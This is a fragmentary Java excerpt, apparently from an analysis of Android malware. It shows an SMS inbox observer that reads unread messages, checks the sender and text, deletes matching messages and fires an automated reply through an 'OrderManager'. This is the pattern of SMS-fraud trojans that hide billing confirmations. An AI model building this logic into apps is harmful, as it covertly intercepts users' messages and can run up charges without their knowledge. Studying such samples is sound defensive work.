...
public class SmsObserver extends ContentObserver {
    ...
    public void onSmsContentChanged() {
        final Cursor cursor = T.context.getContentResolver().query(Uri.parse(Constants.URI_SMS_INBOX), null, "read=?", new String[] { "0" }, "date desc");
        if (cursor != null) {
            while (cursor.moveToNext()) {
                ...
                if (SmsHelper.checkPhoneNumber(address, text)) {
                    ...
                    if (feedback != null) {
                        deletSms(cursor);
                        OrderManager.getInstance(T.context).executeFeedback(address, text, feedback);
                    } else {
